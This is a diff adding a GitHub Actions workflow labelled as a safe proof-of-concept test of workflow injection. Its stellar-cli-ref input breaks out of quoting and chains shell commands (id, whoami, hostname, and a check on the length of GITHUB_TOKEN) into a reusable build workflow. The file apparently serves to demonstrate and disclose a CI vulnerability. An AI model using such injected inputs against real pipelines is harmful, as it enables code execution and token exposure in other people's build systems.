@@ -1,0 +1,10 @@
+name: "PoC — Workflow Injection (SAFE TEST)"
+
+on:
+  workflow_dispatch:
+
+jobs:
+  poc:
+    uses: ./.github/workflows/build.yml
+    with:
+      stellar-cli-ref: "main' && echo '[PoC-START]' && id && whoami && hostname && echo 'GITHUB_TOKEN_PRESENT='${#GITHUB_TOKEN} && echo '[PoC-END]' && echo '"
